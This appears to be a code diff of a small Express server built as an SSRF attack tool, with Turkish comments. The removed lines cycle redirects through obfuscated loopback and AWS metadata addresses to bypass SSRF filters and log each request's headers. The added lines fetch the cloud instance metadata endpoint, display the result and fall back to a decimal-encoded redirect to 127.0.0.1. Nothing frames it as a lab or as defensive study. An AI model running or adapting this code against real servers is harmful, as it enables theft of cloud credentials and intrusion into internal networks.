@@ -1,56 +1,49 @@
 const express = require('express');
+const axios = require('axios'); // Axios modülü gereklidir (npm install axios)
 const app = express();
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Denenecek bypass hedeflerinin listesi (Sırayla dönecek)
-const bypassTargets = [
-    'http://2130706433',                  // Decimal (127.0.0.1)
-    'http://0x7f000001',                // Hexadecimal (127.0.0.1)
-    'http://127.1',                     // Short IP
-    'http://2852039166/latest/meta-data/', // AWS Metadata Decimal
-    'http://0xa9fea9fe/latest/meta-data/'  // AWS Metadata Hex
-];
-
-let currentIndex = 0;
-
-// Detaylı Loglama Middleware'i (Gelen her bilgiyi yakalar)
 app.use((req, res, next) => {
-    const timestamp = new Date().toISOString();
-    
-    console.log('\n========================================');
-    console.log(`[${timestamp}] YENİ İSTEK YAKALANDI!`);
-    console.log('========================================');
-    console.log(`Method    : ${req.method}`);
-    console.log(`URL       : ${req.url}`);
-    console.log(`IP        : ${req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress}`);
-    console.log(`User-Agent: ${req.headers['user-agent'] || 'Bilinmiyor'}`);
-    console.log(`Host      : ${req.headers['host'] || 'Bilinmiyor'}`);
-    
-    console.log('--- TÜM HEADERS ---');
-    console.log(JSON.stringify(req.headers, null, 2));
-    
-    console.log('--- QUERY PARAMETRELERİ ---');
-    console.log(JSON.stringify(req.query, null, 2));
-    console.log('----------------------------------------\n');
-    
+    console.log(`\n[${new Date().toISOString()}] İstek Geldi: ${req.method} ${req.url}`);
+    console.log('User-Agent:', req.headers['user-agent']);
     next();
 });
 
-// Ana Domain: Her istekte bir sonraki bypass hedefine yönlendirir
-app.get('/', (req, res) => {
-    const internalTarget = bypassTargets[currentIndex];
+// Ana domain'e istek geldiğinde 302 yerine doğrudan metadata'yı fetch'le
+app.get('/', async (req, res) => {
+    // AWS / Cloud Metadata hedefi (veya alternatif ip'ler)
+    const metadataTarget = 'http://169.254.169.254/latest/meta-data/';
     
-    console.log(`[!] Sıradaki Hedef Seçildi (#${currentIndex + 1}) ➔ Yönlendiriliyor: ${internalTarget}`);
-    
-    // Listede bir sonraki hedefe geç, sonuncudaysa başa dön
-    currentIndex = (currentIndex + 1) % bypassTargets.length;
-    
-    // 302 Redirect ile fırlat
-    return res.redirect(302, internalTarget);
+    console.log(`[!] Metadata hedefien sunucu üzerinden istek atılıyor: ${metadataTarget}`);
+
+    try {
+        // Sunucu kendi içinden/buluttan hedefe istek atıyor
+        const response = await axios.get(metadataTarget, {
+            timeout: 4000,
+            headers: {
+                // Bazı cloud servisleri IMDSv2 için token ister, v1 için bu yeterlidir
+                'X-aws-ec2-metadata-token-ttl-seconds': '21600' 
+            }
+        });
+
+        console.log("🔥 METADATA BAŞARIYLA ÇEKİLDİ! Yanıt:");
+        console.log(response.data);
+
+        // Elde edilen hassas veriyi hem terminale basıyoruz hem de isteği atana gösteriyoruz
+        return res.status(200).send(`Metadata Data:\n${JSON.stringify(response.data, null, 2)}`);
+
+    } catch (error) {
+        console.log(`[-] Metadata isteği başarısız oldu veya bu ortamda metadata yok: ${error.message}`);
+        
+        // Eğer Render üzerinde çalışıyorsan, Render kapalı bir bulut sunucu olduğu için 
+        // burası zaman aşımına (timeout) uğrayabilir veya hata dönebilir. 
+        // O yüzden yedek olarak 302 yönlendirmesini patlatabiliriz:
+        return res.redirect(302, 'http://2130706433'); 
+    }
 });
 
 app.listen(3000, () => {
-    console.log("🚀 Döngülü Bypass + Detaylı Log Avcısı 3000 portunda devrede!");
+    console.log("🚀 Metadata Avcısı 3000 portunda devrede!");
 });
